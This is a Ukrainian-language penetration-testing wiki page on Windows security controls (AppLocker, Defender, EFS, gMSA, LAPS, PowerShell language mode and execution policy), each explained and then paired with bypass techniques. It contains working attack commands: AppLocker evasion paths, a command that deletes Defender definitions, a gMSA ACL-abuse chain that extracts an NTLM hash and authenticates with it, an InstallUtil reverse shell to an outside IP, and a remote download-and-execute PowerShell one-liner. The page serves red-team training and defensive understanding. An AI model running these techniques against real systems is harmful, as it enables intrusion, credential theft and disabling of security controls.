# Засоби безпеки Windows

{{#include ../../banners/hacktricks-training.md}}

## Політика AppLocker

Список дозволених застосунків — це перелік схвалених програм або виконуваних файлів, які дозволено зберігати та запускати в системі. Його мета — захистити середовище від шкідливого malware і несхваленого програмного забезпечення, яке не відповідає конкретним бізнес-потребам організації.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) — це **рішення Microsoft для створення списку дозволених застосунків**, яке надає системним адміністраторам контроль над тим, **які застосунки та файли можуть запускати користувачі**. Воно забезпечує **детальний контроль** над виконуваними файлами, скриптами, файлами інсталятора Windows, DLL, пакетними застосунками та інсталяторами пакетних застосунків.\
Організації часто **блокують cmd.exe і PowerShell.exe** та доступ на запис до певних каталогів, **але все це можна обійти**.

### Перевірка

Перевірте, які файли/розширення внесено до чорного/білого списків:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Цей шлях реєстру містить конфігурації та політики, застосовані AppLocker, і дає змогу переглянути поточний набір правил, enforced у системі:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Корисні **Writable folders** для обходу AppLocker Policy: Якщо AppLocker дозволяє виконувати будь-що всередині `C:\Windows\System32` або `C:\Windows`, існують **writable folders**, які можна використати, щоб **bypass this**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Загальновідомі **довірені** бінарні файли [**"LOLBAS's"**](https://lolbas-project.github.io/) також можуть бути корисними для обходу AppLocker.
- **Правила, написані неналежним чином, також можна обійти**
- Наприклад, для **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** можна створити **папку з назвою `allowed`** у будь-якому місці, і вона буде дозволена.
- Організації також часто зосереджуються на **блокуванні виконуваного файлу `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, але забувають про **інші** [**місця розташування виконуваних файлів PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), такі як `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` або `PowerShell_ISE.exe`.
- **Примусове застосування DLL дуже рідко вмикають** через додаткове навантаження на систему та обсяг тестування, необхідного для гарантування того, що нічого не перестане працювати. Тому використання **DLL як бекдорів допоможе обійти AppLocker**.
- Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати код Powershell** у будь-якому процесі та обходити AppLocker. Докладніше дивіться тут: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Зберігання облікових даних

### Security Accounts Manager (SAM)

Локальні облікові дані містяться у цьому файлі, паролі хешовані.

### Local Security Authority (LSA) - LSASS

**Облікові дані** (хешовані) **зберігаються** в **пам'яті** цієї підсистеми для забезпечення Single Sign-On.\
**LSA** адмініструє локальну **політику безпеки** (політику паролів, дозволи користувачів...), **автентифікацію**, **токени доступу**...\
LSA перевіряє **надані облікові дані** у файлі **SAM** (для локального входу) та взаємодіє з **контролером домену**, щоб автентифікувати користувача домену.

**Облікові дані** **зберігаються** всередині **процесу LSASS**: квитки Kerberos, хеші NT і LM, паролі, які можна легко розшифрувати.

### Секрети LSA

LSA може зберігати деякі облікові дані на диску:

- Пароль облікового запису комп'ютера Active Directory (недоступний контролер домену).
- Паролі облікових записів служб Windows
- Паролі запланованих завдань
- Інше (пароль застосунків IIS...)

### NTDS.dit

Це база даних Active Directory. Вона присутня лише на контролерах домену.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) — це антивірус, доступний у Windows 10 і Windows 11, а також у версіях Windows Server. Він **блокує** поширені інструменти pentesting, такі як **`WinPEAS`**. Однак існують способи **обійти ці захисти**.

### Перевірка

Щоб перевірити **стан** **Defender**, можна виконати PS cmdlet **`Get-MpComputerStatus`** (перевірте значення **`RealTimeProtectionEnabled`**, щоб дізнатися, чи активний захист):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Щоб також зібрати його дані, можна виконати:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Зашифрована файлова система (EFS)

EFS захищає файли за допомогою шифрування, використовуючи **симетричний ключ**, відомий як **ключ шифрування файлу (FEK)**. Цей ключ шифрується за допомогою **відкритого ключа** користувача та зберігається всередині **альтернативного потоку даних** $EFS зашифрованого файлу. Коли потрібне розшифрування, відповідний **закритий ключ** цифрового сертифіката користувача використовується для розшифрування FEK із потоку $EFS. Докладнішу інформацію можна знайти [тут](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Сценарії розшифрування без ініціації користувача** включають:

- Коли файли або папки переміщуються до файлової системи, що не підтримує EFS, наприклад [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), вони автоматично розшифровуються.
- Зашифровані файли, надіслані мережею через протокол SMB/CIFS, розшифровуються перед передаванням.

Цей метод шифрування забезпечує власнику **прозорий доступ** до зашифрованих файлів. Однак просте змінення пароля власника та вхід до системи не дозволить виконати розшифрування.

**Основні висновки**:

- EFS використовує симетричний FEK, зашифрований відкритим ключем користувача.
- Для розшифрування використовується закритий ключ користувача, щоб отримати доступ до FEK.
- Автоматичне розшифрування відбувається за певних умов, наприклад під час копіювання до FAT32 або передавання мережею.
- Зашифровані файли доступні власнику без додаткових дій.

### Перевірка інформації EFS

Перевірте, чи **користувач** **використовував** цю **службу**, перевіривши наявність цього шляху:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Перевірте, **хто** має **доступ** до файлу, за допомогою cipher /c \<file>\
Також можна використовувати `cipher /e` і `cipher /d` усередині папки, щоб **зашифрувати** та **розшифрувати** всі файли

### Розшифрування файлів EFS

#### Використання Authority System

Цей спосіб потребує, щоб **користувач-жертва** **запустив** **процес** на хості. Якщо це так, використовуючи сесію `meterpreter`, можна видати себе за токен процесу користувача (`impersonate_token` з `incognito`). Або можна просто виконати `migrate` до процесу користувача.

#### Знання пароля користувача


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Групові керовані сервісні облікові записи (gMSA)

Microsoft розробила **групові керовані сервісні облікові записи (gMSA)** для спрощення керування сервісними обліковими записами в ІТ-інфраструктурах. На відміну від традиційних сервісних облікових записів, для яких часто ввімкнено параметр "**Password never expire**", gMSA пропонують безпечніше рішення, яким легше керувати:

- **Автоматичне керування паролями**: gMSA використовують складний пароль довжиною 240 символів, який автоматично змінюється відповідно до політики домену або комп'ютера. Цей процес обробляється Microsoft's Key Distribution Service (KDC), що усуває потребу в ручному оновленні паролів.
- **Підвищена безпека**: ці облікові записи не блокуються та не можуть використовуватися для інтерактивного входу, що підвищує їхню безпеку.
- **Підтримка кількох хостів**: gMSA можна спільно використовувати на кількох хостах, що робить їх ідеальними для сервісів, які працюють на кількох серверах.
- **Можливість виконання запланованих завдань**: на відміну від керованих сервісних облікових записів, gMSA підтримують виконання запланованих завдань.
- **Спрощене керування SPN**: система автоматично оновлює Service Principal Name (SPN), коли змінюються відомості sAMaccount комп'ютера або його DNS-ім'я, що спрощує керування SPN.

Паролі gMSA зберігаються у властивості LDAP _**msDS-ManagedPassword**_ і автоматично скидаються кожні 30 днів контролерами домену (DC). Цей пароль, зашифрований двійковий об'єкт даних, відомий як [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), можуть отримати лише авторизовані адміністратори та сервери, на яких інстальовано gMSA, що забезпечує безпечне середовище. Для доступу до цієї інформації потрібне захищене з'єднання, наприклад LDAPS, або з'єднання має бути автентифіковане за допомогою 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Цей пароль можна прочитати за допомогою [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Більше інформації в цьому дописі**](https://cube0x0.github.io/Relaying-for-gMSA/)

Також перегляньте цю [вебсторінку](https://cube0x0.github.io/Relaying-for-gMSA/) про те, як виконати **NTLM relay attack**, щоб **прочитати** **пароль** **gMSA**.<sup>[[1]](#references)</sup>

### Використання ланцюжків ACL для читання керованого пароля gMSA (GenericAll -> ReadGMSAPassword)

У багатьох середовищах користувачі з низькими привілеями можуть отримати доступ до секретів gMSA без компрометації DC, використовуючи неправильно налаштовані ACL об’єктів:<sup>[[3]](#references)</sup>

- Групі, яку ви можете контролювати (наприклад, через GenericAll/GenericWrite), надано `ReadGMSAPassword` для gMSA.
- Додавши себе до цієї групи, ви успадковуєте право читати blob `msDS-ManagedPassword` gMSA через LDAP і отримуєте придатні для використання облікові дані NTLM.

Типовий порядок дій:

1) Знайдіть шлях за допомогою BloodHound і позначте свої початкові principals як Owned. Шукайте ребра на кшталт:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Додайте себе до контрольованої вами проміжної групи (приклад із bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Прочитайте керований пароль gMSA через LDAP і отримайте NTLM hash. NetExec автоматизує отримання `msDS-ManagedPassword` і перетворення його на NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Автентифікуйтеся як gMSA за допомогою NTLM-хешу (відкритий текст не потрібен). Якщо обліковий запис входить до Remote Management Users, WinRM працюватиме безпосередньо:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Примітки:
- LDAP reads of `msDS-ManagedPassword` потребують sealing (наприклад, LDAPS/sign+seal). Tools обробляють це автоматично.
- gMSAs часто отримують локальні права, як-от WinRM; перевіряйте членство в групах (наприклад, Remote Management Users), щоб планувати lateral movement.
- Якщо вам потрібен лише blob для самостійного обчислення NTLM, дивіться структуру MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

**Local Administrator Password Solution (LAPS)**, доступний для завантаження з [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), забезпечує керування паролями локального Administrator. Ці паролі, які є **рандомізованими**, унікальними та **регулярно змінюються**, централізовано зберігаються в Active Directory. Доступ до цих паролів обмежується за допомогою ACL для авторизованих користувачів. За наявності достатніх дозволів надається можливість читати паролі локального адміністратора.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **блокує багато функцій**, необхідних для ефективного використання PowerShell, зокрема блокування COM objects, дозвіл лише схвалених типів .NET, workflows на основі XAML, PowerShell classes та багато іншого.

### **Перевірка**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Обхід
```bash
#Easy bypass
Powershell -version 2
```
У сучасних версіях Windows цей Bypass не працюватиме, але можна використати [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Для його компіляції може знадобитися** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> додати `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` і **змінити проєкт на .Net4.5**.

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Ви можете використовувати [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) або [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), щоб **виконувати** код Powershell у будь-якому процесі та обходити constrained mode. Докладніше дивіться тут: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Політика виконання PS

За замовчуванням встановлено значення **restricted.** Основні способи обійти цю політику:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Більше можна знайти [тут](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Інтерфейс постачальника підтримки безпеки (SSPI)

Це API, який можна використовувати для автентифікації користувачів.

SSPI відповідає за пошук відповідного протоколу для двох машин, які хочуть встановити зв’язок. Переважним методом є Kerberos. Потім SSPI узгоджує протокол автентифікації, який буде використовуватися. Ці протоколи автентифікації називаються Security Support Provider (SSP), розташовані на кожній машині Windows у вигляді DLL, і обидві машини повинні підтримувати один і той самий протокол, щоб мати змогу взаємодіяти.

### Основні SSP

- **Kerberos**: переважний протокол
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** та **NTLMv2**: з міркувань сумісності
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: вебсервери та LDAP, пароль у вигляді MD5-хешу
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL та TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: використовується для узгодження протоколу (Kerberos або NTLM, причому Kerberos є протоколом за замовчуванням)
- %windir%\Windows\System32\lsasrv.dll

#### Під час узгодження може бути запропоновано кілька методів або лише один.

## UAC - Контроль облікових записів користувачів

[Контроль облікових записів користувачів (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка вмикає **запит підтвердження для дій із підвищеними привілеями**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
